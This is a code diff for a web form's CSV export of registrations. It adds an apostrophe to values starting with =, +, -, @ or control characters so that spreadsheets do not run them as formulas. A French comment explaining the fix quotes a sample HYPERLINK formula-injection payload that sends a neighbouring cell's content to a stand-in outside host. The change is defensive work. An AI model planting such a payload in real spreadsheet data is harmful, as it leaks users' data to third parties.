@@ -1602,7 +1602,20 @@
       : etat.inscriptions;
     if (!liste.length) return;
     var colonnes = Object.keys(liste[0]).filter(function (c) { return c !== 'ligne'; });
-    var cellule = function (v) { return '"' + String(v === null || v === undefined ? '' : v).replace(/"/g, '""') + '"'; };
+    /* UNE FORMULE NE DOIT PAS SORTIR VIVANTE DE L'EXPORT.
+       La feuille Google, elle, est protégée : protegerFormule pose une
+       apostrophe devant toute valeur qui commence par = + - @. Mais cette
+       apostrophe ne se relit pas, donc elle ne part pas dans le CSV — et Excel
+       ou LibreOffice, en ouvrant le fichier, exécutent la formule.
+       Un candidat peut écrire ce qu'il veut dans son nom : le formulaire est
+       ouvert à tous. « =HYPERLINK("https://ailleurs/?x="&C2;"Ouvrir") » suffit
+       à faire partir le contenu d'une cellule voisine au premier clic.
+       On repose donc l'apostrophe ici, au moment d'écrire le fichier. */
+    var cellule = function (v) {
+      var s = String(v === null || v === undefined ? '' : v);
+      if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+      return '"' + s.replace(/"/g, '""') + '"';
+    };
     var csv = '﻿' + colonnes.join(';') + '\n'
       + liste.map(function (i) { return colonnes.map(function (c) { return cellule(i[c]); }).join(';'); }).join('\n');
     var lien = document.createElement('a');
